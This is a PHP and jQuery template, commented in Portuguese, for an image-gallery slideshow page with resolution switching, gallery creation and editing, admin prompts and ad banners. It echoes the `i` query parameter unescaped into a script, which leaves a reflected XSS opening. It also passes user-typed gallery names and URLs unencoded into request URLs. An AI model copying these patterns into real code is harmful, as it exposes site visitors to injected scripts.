       var controles = true; // valor padrão dinamico       
       //asim que apagina carrega, informa que os controles já estão ativados
       if(controles===true){$('.controles').addClass("controles_ativado");}
       //asim que apagina carrega, informa que SlideShow está pausado
       if(slide_automatico===false){$('.parado').addClass("parado_ativado");}
       
       //verifica se o dispositivo e mobile
	if(/Mobi/.test(navigator.userAgent)){
	    tamanho_da_tela;//alert("mobile");
            //se o dispositivo for mobile, adiciona uma resolucao menor
            resolution_value = "800x600";
	}else{
            //se o dispositivo não for mobile, ativa o limite de tela de acordo com o tamanho da janela
	    tamanho_da_tela = $(window).height();//alert("no mobile");   
            //se o dispositivo não for mobile, adiciona uma resolucao maior
            resolution_value = "1024x768";
	}
//CONFIGURAÇÕES DO SLIDE: fim --------------------------------------------------
        
//PEGANDO TODAS AS IMAGENS POR JSON: inicio --------------------------------------------------------------------------------------------------------------------?>
        $.ajax({
            dataType: 'json',            
            url:"function2.php?i=<?php echo $_GET['i'];?>",
            success: function(r){
                var armazena_li = '';
                $.each(r, function(i, li){//pegando as imagens e já ajustando com a resolução definida para dispositivos mobile ou desktop, modificando a reolução nativa vinda do registro              
                    li = li.replace("100x75", resolution_value);
                    li = li.replace("150x100", resolution_value);
                    li = li.replace("280x200", resolution_value);
                    li = li.replace("320x240", resolution_value);
                    li = li.replace("640x480", resolution_value);
                    li = li.replace("800x600", resolution_value); 
                    li = li.replace("1024x768", resolution_value);
                    li = li.replace("1280x1024", resolution_value);
                    li = li.replace("1600x1200", resolution_value);
                    li = li.replace("http", "<?php echo $protocolo;?>"); 
                    armazena_li+=li;
                    //guardando li em array, para ao editar a resolução, não seja preciso um novo ajax
                    arr_li.push(li);
                });
                
                //quando o loop termina, coloca todos os <li> da variavel armazena_li de uma só vez dentro do <ul> 
                //DICA DE http://desenvolvimentoparaweb.com/javascript/otimizar-codigos-jquery-aumentar-performance-front-end/                
                if(galeria_de_imagens.html(armazena_li)){
                  
                    //carrega a galeria 
                    pgwSlideshow.reload({
                        autoSlide: slide_automatico, //variavel no inicio do script
                        transitionEffect : efeito,   //variavel no inicio do script
                        adaptiveDuration : 0,
                        displayControls: controles,
                        intervalDuration : indice_velocidade, //variavel no inicio do script
                        maxHeight : tamanho_da_tela
                    });
                    // insere no seletor o número total de imagens
                    total_de_imagens.html(pgwSlideshow.getSlideCount());
                    // insere no seletor o número da imagem atual
                    imagem_atual.html(pgwSlideshow.getCurrentSlide());
                    // insere no seletor a resolução atual das imagens da galeria
                    current_resolution.html(resolution_value);
                    
                        /*Verifica se a altura da div corresponde ao que deveria ser a altura da imagem
                        caso não, salva o indice da imagem e executa um reload, e assim sucessivamente
                        até a imagem carregar*/
                        setTimeout(function() {
                            
                            if($('.ps-current').height() <= 150){
                                
                                var tempo_imagem = setInterval(function() {
                                    
                                    if($('.ps-current').height() <= 150) { // 150 é o "height-min" para a class .ps-current, por isso, se alguma imagem não for carregada,a class terá o 150 de "height"
                                    
                                            //carrega a galeria 
                                            pgwSlideshow.reload({
                                                autoSlide: slide_automatico, //variavel no inicio do script
                                                transitionEffect : efeito,   //variavel no inicio do script
                                                adaptiveDuration : 0,
                                                displayControls: controles,
                                                intervalDuration : indice_velocidade, //variavel no inicio do script
                                                maxHeight : tamanho_da_tela
                                            });
                                            // insere no seletor o número total de imagens
                                            total_de_imagens.html(pgwSlideshow.getSlideCount());
                                            // insere no seletor o número da imagem atual
                                            imagem_atual.html(pgwSlideshow.getCurrentSlide());
                                            // insere no seletor a resolução atual das imagens da galeria
                                            current_resolution.html(resolution_value);
                                            
                                    }else{ clearInterval(tempo_imagem); }/* Se o height for > 150, quer dizer que a imagem já foi sido carregada.
                                                                          * Então, limpa o intervalo de tempo */                                    
                                },2000);// TIMER
                                
                            }//if($('.ps-current').height() <= 150){
                    
                        }, 1500);
                
                }else{swal({type:'error',text:'Error inserting the <li>(s) into <ul>'});}// se não conseguir inserir os <li> com imagens dentro do <ul>

            }
        });
// PEGANDO TODAS AS IMAGENS POR JSON: fim ---------------------------------------------------------------------------------------------------------------

//RESOLUTION -----------------------------------------------------------------------------------------------------------------------
                    current_resolution.on("click",function() {
                        resolution.trigger("click");
                    });
                    resolution.on("click",function() {
                    swal({
                        html: '<h4>Edit resolution</h4>', 
                        input: 'select',
                        inputOptions: {
                          '640x480': '640x480 (basic)',
                          '800x600': '800x600 (medium)',
                          '1024x768': '1024x768 (large)',
                          '1280x1024': '1280x1024 (high quality)',
                          '1600x1200': '1600x1200 (very high quality)'
                        },
                        inputPlaceholder: 'Select resolution',
                        showCancelButton: true,
                        showCloseButton: true,
                        showLoaderOnConfirm: true,                        
                        preConfirm: function(value) {
                            
                                    //salva a imagem atual para chama-la pós configuração
                                    var imagem_salva = pgwSlideshow.getCurrentSlide();

                                    //insere no seletor o número da imagem atual
                                    imagem_atual.html(pgwSlideshow.getCurrentSlide());

                                    if(value==="" || value!="640x480" && value!="800x600" && value!="1024x768" && value!="1280x1024" && value!="1600x1200"){
                                        swal({
                                                type:"error",
                                                html:"<h5>No resolution selected</h5>"
                                            });
                                    }else{
                                        //mudando o valor da variavel de resolução
                                        resolution_value = value;
                                        var armazena_novas_li = '';
                                        //percorrendo o array de imagens
                                        $.each(arr_li, function(i, li){ //percorrendo o array de <li> com imagens e substituindo qualquer resolução anterior pela nova 
                                            li = li.replace("100x75", resolution_value);
                                            li = li.replace("150x100", resolution_value);
                                            li = li.replace("280x200", resolution_value);
                                            li = li.replace("320x240", resolution_value);
                                            li = li.replace("640x480", resolution_value);
                                            li = li.replace("800x600", resolution_value);
                                            li = li.replace("1024x768", resolution_value);
                                            li = li.replace("1280x1024", resolution_value);
                                            li = li.replace("1600x1200", resolution_value);
                                            armazena_novas_li+=li;
                                        });
                                        //insere os <li> com imagens vindo do php dentro do <ul>, e ao mesmo tempo verifica se esse comando teve sucesso
                                        if(galeria_de_imagens.html(armazena_novas_li)){
                                            //carrega a galeria 
                                            pgwSlideshow.reload({
                                                autoSlide: slide_automatico, //variavel no inicio do script
                                                transitionEffect : efeito,   //variavel no inicio do script
                                                adaptiveDuration : 0,
                                                displayControls: controles,
                                                intervalDuration : indice_velocidade, //variavel no inicio do script
                                                maxHeight : tamanho_da_tela
                                            });
                                            // insere no seletor o número total de imagens
                                            total_de_imagens.html(pgwSlideshow.getSlideCount());                                   
                                            // insere no seletor a resolução atual das imagens da galeria
                                            current_resolution.html(resolution_value);
                                            // restaura a imagem anterior com uma nova resolução
                                            pgwSlideshow.displaySlide(imagem_salva);
                                            // insere no seletor o número da imagem atual
                                            imagem_atual.html(pgwSlideshow.getCurrentSlide());

                                                /*Verifica se a altura da div corresponde ao que deveria ser a altura da imagem
                                                caso não, salva o indice da imagem e executa um reload, e assim sucessivamente
                                                até a imagem carregar*/
                                                setTimeout(function() {

                                                    if($('.ps-current').height() <= 150){ // só executa se a imagem não for carregada

                                                        var tempo_imagem = setInterval(function() { 

                                                            if($('.ps-current').height() <= 150) { // 150 é o "height-min" para a class .ps-current, por isso, se alguma imagem não for carregada,a class terá o 150 de "height"
                                                                    //carrega a galeria 
                                                                    pgwSlideshow.reload({
                                                                        autoSlide: slide_automatico, //variavel no inicio do script
                                                                        transitionEffect : efeito,   //variavel no inicio do script
                                                                        adaptiveDuration : 0,
                                                                        displayControls: controles,
                                                                        intervalDuration : indice_velocidade, //variavel no inicio do script
                                                                        maxHeight : tamanho_da_tela
                                                                    });                                                            
                                                                    //restaura a imagem anterior com uma nova resolução
                                                                    pgwSlideshow.displaySlide(imagem_salva);
                                                                    // insere no seletor o número da imagem atual
                                                                    imagem_atual.html(pgwSlideshow.getCurrentSlide());                                                            
                                                            }else{ /* Se o height for > 150, quer dizer que a imagem já foi sido carregada.
                                                                    * Então, criar um alert de sucesso e limpa o intervalo de tempo */     

                                                                    // insere no seletor o número total de imagens
                                                                    total_de_imagens.html(pgwSlideshow.getSlideCount());
                                                                    // insere no seletor o número da imagem atual
                                                                    imagem_atual.html(pgwSlideshow.getCurrentSlide());
                                                                    // insere no seletor a resolução atual das imagens da galeria
                                                                    current_resolution.html(resolution_value);

                                                                    swal({
                                                                        type:"success",
                                                                        html:"<h5>New resolution: <b>"+value+"</h5>",
                                                                        showConfirmButton: false,
                                                                        timer: 1500
                                                                    });

                                                                    clearInterval(tempo_imagem); 

                                                                }                            
                                                        },3000);// TIMER

                                                    }//if($('.ps-current').height() <= 150){
                                                    else{
                                                        swal({
                                                            type:"success",
                                                            html:"<h5>New resolution: <b>"+value+"</h5>",
                                                            showConfirmButton: false,
                                                            timer: 1500
                                                        });

                                                        // insere no seletor o número total de imagens
                                                        total_de_imagens.html(pgwSlideshow.getSlideCount());
                                                        // insere no seletor o número da imagem atual
                                                        imagem_atual.html(pgwSlideshow.getCurrentSlide());
                                                        // insere no seletor a resolução atual das imagens da galeria
                                                        current_resolution.html(resolution_value);                                                
                                                    }
                                                }, 1500);

                                        }else{swal({type:'error',text:'Error inserting the <li>(s) into <ul>'});}// se não conseguir inserir os <li> com imagens dentro do <ul>

                                    }//else                                  
                                                          
                        }//preConfirm
                    });//swal                    
                });// RESOLUTION

// CLICKS NAS SETAS DO TECLADO e F5, CLICKS NAS SETAS DO SLIDE E TOUCHMOVE: Inicio ---------------------------------------------------------------------------
        document.onkeyup=function(e){
            if(e.which == 37){
              //Pressionou left arrow <=
              pgwSlideshow.previousSlide();
              imagem_atual.html(pgwSlideshow.getCurrentSlide());              
              return false;
            }
            if(e.which == 39){
              //Pressionou right arrow =>
              pgwSlideshow.nextSlide();
              imagem_atual.html(pgwSlideshow.getCurrentSlide());               
              return false;
            }            
        }
        
        //cada vez que a galeria receber um clique atualiza o número da imagem atual, e verifica se a imagem foi carregada
        div_galeria.on("click", function() {
            imagem_atual.html(pgwSlideshow.getCurrentSlide());
        });
        //cada vez que a galeria receber um touchmove atualiza o número da imagem atual, e verifica se a imagem foi carregada
        div_galeria.on("touchmove", function() {
            imagem_atual.html(pgwSlideshow.getCurrentSlide());   
        });
// CLICKS NAS SETAS DO TECLADO, CLICKS NAS SETAS DO SLIDE E TOUCHMOVE: Fim --------------------------------------------------------------------------------
       
// NEW GALLERY --------------------------------------------------------------------------------------------------------------------------------------------
        newGallery.on("click", function(){
            swal({
                html:'<h4>New Gallery</4><h6>Name limit: 100 characters</h6><input maxlength="100" value="" id="gallery-name" class="swal2-input" placeholder="Gallery name"><h6>URLs limit: 8.150 characters</h6>',
                input: 'textarea',
                inputPlaceholder: 'Example:\nhttp://site/image1.jpeg\nhttp://site/image2.gif\nhttp://site/image3.png\nhttp://site/image4.jpg',
                showCancelButton: true,
                showCloseButton: true,
                showLoaderOnConfirm: true, 
                inputAttributes: {
                    'maxlength': 8150,
                    'autocapitalize': 'off',
                    'autocorrect': 'off'
                },
                onOpen: function (){
                    var text_val = $(".swal2-textarea");
                    text_val.keyup(function(){
                        if(text_val.val()==="cut"){
                            swal({ 
                                    title: 'Reduce GET',
                                    html:'<input value="http://imagizer.imageshack.com/v2/100x75q90/" id="swal-input1" class="swal2-input" placeholder="Remove string"><input value="_" id="swal-input2" class="swal2-input" placeholder="key character">',         
                                    focusConfirm: false,
                                    showCloseButton: true,
                                    showCancelButton: true,
                                    showLoaderOnConfirm: true,
                                    preConfirm: function () {
                                        var remove_string = $('#swal-input1').val();
                                        var caractere_chave = $('#swal-input2').val();
                                        //para evitar erros e travamentos, verifica os campos cumprem os requisitos abaixo
                                        if(remove_string.length >= 5 && caractere_chave.length <=2 && remove_string!="" && caractere_chave!=""){
                                                swal({
                                                    html: "<h5>Edit URLs</h5><b>replace the value</b> "+remove_string+" <b>by</b> "+caractere_chave,
                                                    input: 'textarea',
                                                    inputPlaceholder: 'Example:\nhttp://site/image1.jpeg\nhttp://site/image2.gif\nhttp://site/image3.png\nhttp://site/image4.jpg',
                                                    showCancelButton: true,
                                                    showLoaderOnConfirm: true,
                                                    showCloseButton: true,    
                                                    inputAttributes: {
                                                        'maxlength': 10000000,
                                                        'autocapitalize': 'off',
                                                        'autocorrect': 'off'
                                                    },
                                                    preConfirm: function(text) {
                                                        //para evitar erros e travamentos, verifica se o textarea cumpre os requisitos abaixo
                                                        if(text.length >= 200 && text!==""){

                                                                var cut = remove_string;
                                                                var chave = caractere_chave;

                                                                function replaceAll(string, token, newtoken) {
                                                                    while (string.indexOf(token) != -1) {
                                                                            string = string.replace(token, newtoken);
                                                                    }
                                                                    return string;
                                                                }
                                                                //removendo todas as quebras de linhas
                                                                text = text.replace(/(\r\n|\n|\r)/gm,"");
                                                                //cortando e substituindo o valor default da string por um caractere chave | RESULTADO: "_."
                                                                var new_text1 = replaceAll(text, cut, chave+".");
                                                                ////cortando e substituindo a extensao da imagem por pelo caractere chave escolhido | RESULTADO: "._"
                                                                var new_text2 = replaceAll(new_text1, "jpg", chave);
                                                                //criando o caractere chave
                                                                var head_text = chave+"="+cut+";";
                                                                var length = head_text.length+new_text2.length;
                                                                swal({
                                                                    title: "New URLs",
                                                                    input: 'textarea',
                                                                    inputValue: "Length: "+length+" "+head_text+new_text2,
                                                                    confirmButtonText:"OK",
                                                                    showCloseButton: true,   
                                                                    showCancelButton: false
                                                                });
                                                        }else{
                                                            swal({type:"error"});
                                                        }
                                                    }
                                           });
                                        }else{
                                            swal({type:"error"});
                                        }
                                    }//preconfirm reduce get, primeiro textarea
                                });
                        }
                        // Pegar as URLs de um arquivo do servidor
                        if(text_val.val()==="file"){
                            $(".swal2-confirm").trigger("click");                           
                        }
                        // Chama o alert de edição
                        if(text_val.val()==="edit"){
                            swal({
                                html:'<h4>Edit Gallery</4><input maxlength="100" value="" id="gallery-name" class="swal2-input" placeholder="Gallery name"><h6>URLs limit: 8.150 characters</h6>',
                                input: 'textarea',
                                inputPlaceholder: 'Example:\nhttp://site/image1.jpeg\nhttp://site/image2.gif\nhttp://site/image3.png\nhttp://site/image4.jpg',
                                showCancelButton: true,
                                showCloseButton: true,
                                showLoaderOnConfirm: true,
                                inputAttributes: {
                                    'maxlength': 8150,
                                    'autocapitalize': 'off',
                                    'autocorrect': 'off'
                                },
                                preConfirm: function(text){ 
                                    //pegando o nome da galeria
                                    var gallery_name1 = $('#gallery-name').val(); 
                                    function replaceAll(string, token, newtoken){
                                                        while (string.indexOf(token) != -1) {
                                                                string = string.replace(token, newtoken);
                                                        }
                                                return string;
                                            }

                                    //cortando e substituindo o valor default da string por um caractere chave | RESULTADO: "_."
                                    var gallery_name = replaceAll(gallery_name1, "&", "and");
                                    //removendo todas as quebras de linhas
                                    gallery_name = gallery_name.replace(/(\r\n|\n|\r)/gm,"");
                                    //removendo todas as quebras de linhas
                                    text = text.replace(/(\r\n|\n|\r)/gm,"");

                                    //se atingiu o limite maximo de caracteres
                                    if(text.length==8150){
                                        swal({
                                             html:"<h4 style='color:red'>8.150 Characters</h4>Characters maximum reached. Make sure the last URL has not been cut down.",
                                             type:"warning",
                                             confirmButtonText:"It's all right. Edit gallery.",
                                             cancelButtonText: "Wait, I'll check.", 
                                             showCancelButton: true
                                            }).then(function() {
                                               $.ajax({                 
                                                    url: "function-edit.php?name="+gallery_name+"&urls="+text,
                                                    success: function(a){
                                                            if(a){
                                                                if(a!="erro"){
                                                                swal({
                                                                      title: 'Gallery Edited',
                                                                      html: "URL: <a href='<?php echo $arr_url[0];?>?i="+a+"' target='_blank'><?php echo $arr_url[0];?>?i="+a+"</a>",
                                                                      type: 'success'
                                                                    })
                                                                }else{                                                          
                                                                    swal({type: 'error'});
                                                                }
                                                            }
                                                        } //success                  
                                                    })//ajax
                                            });
                                    }// if(text.length==8150){
                                    else{
                                        $.ajax({                 
                                                    url: "function-edit.php?name="+gallery_name+"&urls="+text,
                                                    success: function(a){
                                                            if(a){
                                                                if(a!="erro"){
                                                                swal({
                                                                      title: 'Gallery Edited',
                                                                      html: "URL: <a href='<?php echo $arr_url[0];?>?i="+a+"' target='_blank'><?php echo $arr_url[0];?>?i="+a+"</a>",
                                                                      type: 'success'
                                                                    })
                                                                }else{                                                          
                                                                    swal({type: 'error'});
                                                                }
                                                            }
                                                        } // success                  
                                                    })// ajax
                                    }
                                }
                            });// swal              
                        } // if(text_val.val()==="edit"){
                        // Enviar Arquivo não desenvolvido
                        if(text_val.val()==="send"){}
                    });   
                },
                preConfirm: function(text) { 
                    //pegando o nome da galeria
                    var gallery_name1 = $('#gallery-name').val(); 
                                        
                    //se atingiu o limite maximo de caracteres
                    if(text.length==8150){ 
                        swal({
                             html:"<h4 style='color:red'>8.150 Characters</h4>Characters maximum reached. Make sure the last URL has not been cut down.",
                             type:"warning",
                             confirmButtonText:"It's all right. Create gallery.",
                             cancelButtonText: "Wait, I'll check.", 
                             showCancelButton: true
                            }).then(function() {
                               $.ajax({                 
                                    url: "function.php?name="+gallery_name1+"&urls="+text,
                                    success: function(a){
                                            if(a){
                                                if(a!="erro"){
                                                swal({
                                                      title: 'Gallery created',
                                                      html: "URL: <a href='<?php echo $arr_url[0];?>?i="+a+"' target='_blank'><?php echo $arr_url[0];?>?i="+a+"</a>",
                                                      type: 'success'
                                                    })
                                                }else{                                                          
                                                    swal({
                                                      title: "Invalid URL",
                                                      type: 'error'
                                                    });
                                                }
                                            }
                                        } //success                  
                                    })//ajax
                            });
                    }else{  
                        // se não foi requisitado uma redução de GET, ou seja, se for uma envio normal
                        $.ajax({                 
                            url: "function.php?name="+gallery_name1+"&urls="+text,
                            success: function(a){
                                    if(a){
                                        if(a!="erro"){
                                        swal({
                                            title: 'Gallery created',
                                            html: "URL: <a href='<?php echo $arr_url[0];?>?i="+a+"' target='_blank'><?php echo $arr_url[0];?>?i="+a+"</a>",
                                            type: 'success'
                                        })
                                    }else{                                                          
                                         swal({
                                               title: "Invalid URL",
                                               type: 'error'
                                        });
                                    }
                                }
                            } //success                  
                        })//ajax
                    }                    
                }
            });//swal   
        });//click New Gallery -------------------------------------------------------------------------------------------------------------------------------------
        
        terms.on("click", function() { 
            swal({
                title:"Terms of service",
                text:"This script does not store images, it only receives external URLs to create a gallery. Even so, any gallery with images of pedophilia or bestiality will be banned."
            })
            
        });//Click Terms script
        
        <?php if(file_exists("docs/info.txt")){if(file_get_contents("docs/info.txt")=="1"){?>
        //aviso para criar senha
        
                swal({
                    title:"For security",
                    text:"you must create a password for your administrative area.",
                    showCloseButton: true,
                    showCancelButton: true,
                    confirmButtonText: 'Yes, create my password'
                }).then(function() {
                    window.location="./table/"
                });                
       
      <?php }/*fim do aviso 1*/ if(file_get_contents("docs/info.txt")=="2" && file_exists("docs/links/link_admin.txt")){ ?>
        //aviso para remover link para area admin        
                swal({
                    title:"We recommend",
                    text:"that you remove the 'admin' link. You can still access it through the address bar.",
                    showCancelButton: true,
                    showCloseButton: true,
                    confirmButtonText: "Yes, remove the link"
                }).then(function() {
                    window.location="function1.php?aviso2"
                }, function(dismiss) { 
                    if(dismiss === 'cancel'){
                        swal({
                            title:'Ok =)',
                            text:'if you change your mind, to remove any link from the menu, delete the file with the same name in the directory "gallery / docs / links /" :)'                            
                          }).then(function() {
                                window.location="function1.php?manter_admin"
                            });
                    }
                });               
       <?php }/*fim do aviso 2*/} ?>  
      
// Só configurações do slide -------------------------------------------------------------------------------------------------------------------------
                               
        // HOVER NA GALERIA, informa que o slide foi pausado
        div_galeria.hover(
        function() { 
            parado.addClass("parado_ativado");
            }, function() {
                // se o slide estiver automático, remove o a classe parado_ativado
                if(slide_automatico==true){
                      parado.removeClass("parado_ativado");
                }            
            }
        );        
       
// RECARREGAR GALERIA --------------------------------------------------------------------------------------------------------------------------------
       recarregar.on("click", function() {
          parado.addClass("parado_ativado");
          class_controles.addClass("controles_ativado");
          effects.removeClass("efeito_ativado");          
          automatico_ativado.addClass("automatico").removeClass("automatico_ativado");
          automatico_velocidade.addClass("oculto");
          //Não foi usado o seletor em cache "class_automatico" pq ele está selecioando dois elementos que justamente entariam em conflito agora
          //pois um teria que fesaparecer e outro reaparecer. Mas, pq tive que usar os dois na função e slide automatico, tive que selecionar os dois.
          $(".automatico").removeClass("oculto");
          //voltando algumas variaveis ao seu valor padrão
          slide_automatico=false;efeito="sliding";controles=true;
          
          pgwSlideshow.reload({
                    autoSlide: slide_automatico, //variavel no inicio do script
                    transitionEffect : efeito,   //variavel no inicio do script
                    adaptiveDuration : 0,
                    displayControls: controles,
                    intervalDuration : indice_velocidade, //variavel no inicio do script
                    maxHeight : tamanho_da_tela
         });
         // insere no seletor o número da imagem atual
         imagem_atual.html(pgwSlideshow.getCurrentSlide());
       });
       
// AUTOMATICO -----------------------------------------------------------------------------------------------------------------------------------------
           class_automatico.on("click", function() {
           swal({
                title:"Time interval (seconds)",
                input: 'range',
                confirmButtonText:"START",
                showCloseButton: true,    
                showCancelButton: true,
                inputAttributes: {
                  min: 1,
                  max: 10,
                  step: 1
                },
                inputValue: 1
              }).then(function(value) {
                  
                    indice_velocidade = 1000*value; // convertendo em milisegundos
                                
                    //atualizando o display que mostra o indice da imagem
                    var tempo_s = setInterval(function(){
                         imagem_atual.html(pgwSlideshow.getCurrentSlide());                        
                    }, indice_velocidade);

                    //parando as atualizações por segundo
                    parado.on("click", function() {
                        clearInterval(tempo_s);
                    });
                    //parando as atualizações por segundo
                    recarregar.on("click", function() {
                        clearInterval(tempo_s);
                    });

                    //ocultando controles
                    controles = false;
                    //definindo que agora os slides serão automaticos
                    slide_automatico = true;
                    //ocultando o btn start
                    $(".automatico").addClass("oculto");
                    //informa que o controle foi desatiivado           
                    class_controles.removeClass("controles_ativado");
                    //informa que o btn "parado" está desativado
                    parado.removeClass("parado_ativado");
                    //faz o btn timer aparecer
                    automatico_velocidade.removeClass("oculto");             
                    //insere o tempo escolhido no display
                    automatico_velocidade.html("<i class='material-icons small tempo'>timer</i>"+value+"s");
                    //salva a imagem atual para chama-la pós configuração
                    var imagem_salva = pgwSlideshow.getCurrentSlide();
                    //atualiza o slide com novas configurações
                    pgwSlideshow.reload({
                         autoSlide: slide_automatico, //variavel no inicio do script
                         transitionEffect : efeito,   //variavel no inicio do script
                         adaptiveDuration : 0,
                         displayControls: controles,
                         intervalDuration : indice_velocidade, //variavel no inicio do script
                         maxHeight : tamanho_da_tela
                     });
                    if(pgwSlideshow.displaySlide(imagem_salva)){                        
                        <?php 
                            session_start(); if(!isset($_SESSION['alert_pause_timer'])){$_SESSION['alert_pause_timer']=false;}
                            if($_SESSION['alert_pause_timer']===false){session_start();$_SESSION['alert_pause_timer']=true;
                        ?>
                        if(div_galeria.hover){
                            swal({title:'Mouse over the slide to pause the timer'});
                        }
                        <?php } ?> 
                    }
              });
       
       });
       
// PARADO ------------------------------------------------------------------------------------------------------------------------------------------------
       parado.on("click", function(){            
           //definindo que agora os slides serão manuais
           slide_automatico = false;
           $(this).addClass("parado_ativado");
           automatico_ativado.addClass("automatico").removeClass("automatico_ativado");
           automatico_velocidade.addClass("oculto");
           $(".automatico").removeClass("oculto");
           pgwSlideshow.stopSlide();        
       });
       
// EFEITOS DE TRANSIÇÃO -------------------------------------------------------------------------------------------------------------------------------------       
       // se o btn de efeitos for clicado 
       effects.on("click", function(){
           
           if(efeito==="sliding"){
               efeito="fading";$(this).addClass("efeito_ativado");
           }else{efeito="sliding";$(this).removeClass("efeito_ativado");}
           
           var imagem_salva = pgwSlideshow.getCurrentSlide();
           //atualiza o slide com novas configurações
           pgwSlideshow.reload({
                autoSlide: slide_automatico, //variavel no inicio do script
                transitionEffect : efeito,   //variavel no inicio do script
                adaptiveDuration : 0,
                displayControls: controles,
                intervalDuration : indice_velocidade, //variavel no inicio do script
                maxHeight : tamanho_da_tela
            });
            pgwSlideshow.displaySlide(imagem_salva);
           
       });
              
// CONTROLES ----------------------------------------------------------------------------------------------------------------------------------------------
       // se o btn de controles for clicado 
       class_controles.on("click", function(){
           
           if(controles===false){
               controles=true;$(this).addClass("controles_ativado");
           }else{
               controles=false;$(this).removeClass("controles_ativado");
           }
           
           var imagem_salva = pgwSlideshow.getCurrentSlide();
           //atualiza o slide com novas configurações
           pgwSlideshow.reload({
                autoSlide: slide_automatico, //variavel no inicio do script
                transitionEffect : efeito,   //variavel no inicio do script
                adaptiveDuration : 0,
                displayControls: controles,
                intervalDuration : indice_velocidade, //variavel no inicio do script
                maxHeight : tamanho_da_tela
            });
            pgwSlideshow.displaySlide(imagem_salva);
           
       });
// PESQUISA DE IMAGENS: Inicio -------------------------------------------------------------------------------------------------------------------------------       
       pesquisar.on("click", function() {
           swal({
                title: "Picture number",
                input: 'range',
                confirmButtonText:"OPEN",
                showCloseButton: true,   
                showCancelButton: true,
                inputAttributes: {
                  min: 1,
                  max: pgwSlideshow.getSlideCount(),
                  step: 1
                },
                inputValue: 1,
                showLoaderOnConfirm: true,
                preConfirm: function(value){
                        if(pgwSlideshow.displaySlide(value)){
                             
                             // insere no seletor o número da imagem atual
                             imagem_atual.html(pgwSlideshow.getCurrentSlide());
                             //salva a imagem atual para chama-la pós configuração
                             var imagem_salva = pgwSlideshow.getCurrentSlide();
                             
                             /*Verifica se a altura da div corresponde ao que deveria ser a altura da imagem
                               caso não, salva o indice da imagem e executa um reload, e assim sucessivamente
                               até a imagem carregar*/
                            setTimeout(function() { /* Esse tempo para executar o codigo abaixo é preciso, pois por conta da rapidez do comando, o 
                                                    jquery iria selecionar o height da imagem anterior, informando imediatamente um 'falso sucesso',
                                                    já que seu height seria > 150. Com esse setTimeout, o comando tem tempo o suficiente para selecionar
                                                    o height da imagem requisitada*/
                                    if($('.ps-current').height() == 150){
                                        var tempo_imagem = setInterval(function(){ // TIMER
                                            if($('.ps-current').height() == 150){ // 150 é o "height-min" para a class .ps-current, por isso, se alguma imagem não for carregada,a class terá o 150 de "height"
                                                //atualiza o slide com novas configurações. No caso, para fazer a imagem requisitada aparecer.
                                                pgwSlideshow.reload({
                                                     autoSlside: slide_automatico, //variavel no inicio do script
                                                     transitionEffect : efeito,   //variavel no inicio do script
                                                     adaptiveDuration : 0,
                                                     displayControls: controles,
                                                     intervalDuration : indice_velocidade, //variavel no inicio do script
                                                     maxHeight : tamanho_da_tela
                                                });
                                                //coloca a imagem requisitada de volta no display
                                                pgwSlideshow.displaySlide(imagem_salva);
                                                // insere no seletor o número da imagem atual
                                                imagem_atual.html(pgwSlideshow.getCurrentSlide());
                                                
                                            }else{// SE O BUG FOI RESOLVIDO E A IMAGEM APARECEU NO DISPLAY
                                                    // alert apenas para finalizar o "preConfirm" 
                                                    swal({showConfirmButtont:false,timer: 50});
                                                    // limpa o loop de tempo
                                                    clearInterval(tempo_imagem);
                                            } 
                                        }, 3000);// TIMER var tempo_imagem
                                   }else{
                                        // alert super rapido apenas para finalizar o "preConfirm"
                                        swal({showConfirmButtont:false,timer: 50});
                                   }    
                           },1500);                                 
                         }else{swal({type:'error'});}// se não conceguir carregar a imagem solicitada
                } //preConfirm
              });
        });
// PESQUISA DE IMAGENS: Fim -----------------------------------------------------------------------------------------------------------------------------------      

// FIM: configurações do slide ------------------------------------------------------------------------------------------------------------------------- 
                
});//jquery
/*gallery.setAutoThreadsEnabled(true);gallery.setThrottle(0.5);*/
</script>
<style>
.swal2-modal .swal2-range output{
    font-size: 30px;
}

#gallery-name{background-color: black;color: deepskyblue;}
#gallery-name::selection{background-color: orange; color: black;}

#imagem_atual,#total_de_imagens{
    margin-left:4px;margin-right:4px;color: #1565c0;
}
.recarregar{
    margin-left:5px;
    margin-right:0px;
    color: #1565c0;
    cursor: pointer;
}
.automatico,.automatico_velocidade{
    margin-left:0px;
    margin-right:10px;
    color: #1565c0;
    cursor: pointer;
}
.parado{
    margin-left:0px;
    margin-right:10px;
    color: #1565c0;
    cursor: pointer;
}
.effects{
    margin-left:0px;
    margin-right:10px;
    color: #1565c0;
    cursor: pointer;
}
.controles{
    margin-left:0px;
    margin-right:10px;
    color: #1565c0;
    cursor: pointer;
}
.resolution{
    margin-left:0px;
    margin-right:10px;
    color: #1565c0;
    cursor: pointer;
}
.current_resolution{
    color: #78909c;
    cursor: pointer;
    font-size: 12px;    
}
.pesquisar{
    margin-left:0px;
    margin-right:0px;
    color: #1565c0;
    cursor: pointer;
}
/*menus ativados ou com hover*/
.automatico_velocidade,.parado_ativado,.efeito_ativado,.controles_ativado{
    color: #c40000;
    cursor: pointer; 
}
<?php if(!$detect->isMobile()){?>
.automatico:hover,.automatico_velocidade:hover,.parado:hover,.effects:hover,.controles:hover,.resolution:hover,.pesquisar:hover,.recarregar:hover{
    color: #c40000;
    cursor: pointer;
}
<?php }?>
.title{font-size: 20px;}
.admin{cursor: pointer;}
.oculto{display: none; transition: 0.9s;}
.separador{margin-left:4px; margin-right:4px;}
.pgwSlideshow{margin-top: -20px;}
</style>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
</head>
<body>
<div class="div">
<?php $sorteio1 = rand(1,3);$sorteio2 = rand(1,2);?>   
            
            <center>
            <?php if($detect->isMobile()){//se for mobile, sorteia um banner para mostrar?>
                
            <?php if($sorteio1===1){?>
            <iframe data-aa='689811' src='//ad.a-ads.com/689811?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
            <?php }?>
            
            <?php if($sorteio1===2){?>
            <iframe data-aa='691940' src='//ad.a-ads.com/691940?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
            <?php }?>
            
            <?php if($sorteio1===3){?> 
            <iframe data-aa='691957' src='//ad.a-ads.com/691957?size=320x50' scrolling='no' style='width:320px; height:50px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
            <?php }?>
            
            <?php }else{//se não for mobile, mostra todos os banners?>
                
